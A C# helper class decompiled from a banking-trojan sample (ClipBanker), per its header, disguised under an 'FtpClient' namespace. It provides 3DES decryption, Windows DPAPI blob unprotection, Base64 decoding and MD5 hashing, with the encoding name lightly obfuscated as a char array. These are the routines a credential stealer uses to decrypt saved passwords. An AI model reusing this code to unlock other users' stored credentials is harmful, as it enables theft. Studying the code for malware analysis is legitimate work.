// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Helpers.CryptoHelper
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using System;
using System.Collections.Generic;
using System.Globalization;
using System.Security.Cryptography;
using System.Text;

namespace FtpClient.Data.Helpers
{
  public static class CryptoHelper
  {
    public static string Decrypt3DES(byte[] key, byte[] iv, byte[] input, PaddingMode paddingMode = PaddingMode.None)
    {
      using (TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider())
      {
        cryptoServiceProvider.Key = key;
        cryptoServiceProvider.IV = iv;
        cryptoServiceProvider.Mode = CipherMode.CBC;
        cryptoServiceProvider.Padding = paddingMode;
        using (ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor(key, iv))
          return Encoding.GetEncoding(new string(new char[12]
          {
            'w',
            'i',
            'n',
            'd',
            'o',
            'w',
            's',
            '-',
            '1',
            '2',
            '5',
            '1'
          })).GetString(decryptor.TransformFinalBlock(input, 0, input.Length));
      }
    }

    public static string Base64Decode(string input)
    {
      try
      {
        return Encoding.UTF8.GetString(Convert.FromBase64String(input));
      }
      catch
      {
        return input;
      }
    }

    public static string EncryptBlob(string rawText) => Convert.ToBase64String(ProtectedData.Protect(Encoding.GetEncoding(new string(new char[12]
    {
      'w',
      'i',
      'n',
      'd',
      'o',
      'w',
      's',
      '-',
      '1',
      '2',
      '5',
      '1'
    })).GetBytes(rawText), (byte[]) null, DataProtectionScope.CurrentUser));

    public static string DecryptBlob(
      string EncryptedData,
      DataProtectionScope dataProtectionScope,
      byte[] entropy = null)
    {
      return Encoding.UTF8.GetString(CryptoHelper.DecryptBlob(Encoding.GetEncoding(new string(new char[12]
      {
        'w',
        'i',
        'n',
        'd',
        'o',
        'w',
        's',
        '-',
        '1',
        '2',
        '5',
        '1'
      })).GetBytes(EncryptedData), dataProtectionScope, entropy));
    }

    public static byte[] DecryptBlob(
      byte[] EncryptedData,
      DataProtectionScope dataProtectionScope,
      byte[] entropy = null)
    {
      try
      {
        return EncryptedData == null || EncryptedData.Length == 0 ? (byte[]) null : ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
      }
      catch (Exception ex)
      {
        return (byte[]) null;
      }
    }

    public static byte[] ConvertHexStringToByteArray(string hexString)
    {
      byte[] byteArray = hexString.Length % 2 == 0 ? new byte[hexString.Length / 2] : throw new ArgumentException(string.Format((IFormatProvider) CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[1]
      {
        (object) hexString
      }));
      for (int index = 0; index < byteArray.Length; ++index)
      {
        string s = hexString.Substring(index * 2, 2);
        byteArray[index] = byte.Parse(s, NumberStyles.HexNumber, (IFormatProvider) CultureInfo.InvariantCulture);
      }
      return byteArray;
    }

    public static string GetMd5Hash(string source) => CryptoHelper.GetHexString((IList<byte>) new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(source))).Replace("-", string.Empty);

    private static string GetHexString(IList<byte> bt)
    {
      string hexString = string.Empty;
      for (int index = 0; index < bt.Count; ++index)
      {
        int num1 = (int) bt[index];
        int num2 = num1 & 15;
        int num3 = num1 >> 4 & 15;
        string str = num3 <= 9 ? hexString + num3.ToString((IFormatProvider) CultureInfo.InvariantCulture) : hexString + ((char) (num3 - 10 + 65)).ToString((IFormatProvider) CultureInfo.InvariantCulture);
        hexString = num2 <= 9 ? str + num2.ToString((IFormatProvider) CultureInfo.InvariantCulture) : str + ((char) (num2 - 10 + 65)).ToString((IFormatProvider) CultureInfo.InvariantCulture);
        if (index + 1 != bt.Count && (index + 1) % 2 == 0)
          hexString += "-";
      }
      return hexString;
    }
  }
}
